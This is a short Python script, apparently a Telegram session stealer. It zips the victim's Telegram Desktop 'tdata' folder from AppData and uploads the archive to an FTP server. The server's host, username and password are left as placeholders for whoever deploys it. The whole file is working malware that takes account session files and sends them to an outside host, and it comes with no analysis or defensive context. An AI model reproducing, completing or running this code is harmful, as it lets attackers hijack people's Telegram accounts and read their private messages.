import os.path
from ftplib import FTP
from zipfile import ZipFile

# Searching path to file
pathusr = os.path.expanduser('~')
# Checking file
file_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8C0'

found = os.path.exists(file_path)

with ZipFile(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata.zip', 'w') as zipObj:
    # Iterate over all the files in directory
    for folderName, subfolders, filenames in os.walk(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'):
        for filename in filenames:
            try:
                # create complete filepath of file in directory
                filePath = os.path.join(folderName, filename)
                # Add file to zip
                zipObj.write(filePath)
            except:
                continue

# FTP module to connect server
ftp = FTP()
ftp.set_debuglevel(2)
ftp.connect('Host of your FTP', 21)
ftp.login('Login for your FTP', 'Pass for your FTP')
ftp.cwd('/folder where you want to save file on FTP server')

# Sending file on FTP server
print(ftp.dir())
fp = open(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata.zip', 'rb')
ftp.storbinary('STOR %s' % os.path.basename("tdata.zip"), fp, 1024)
fp.close()
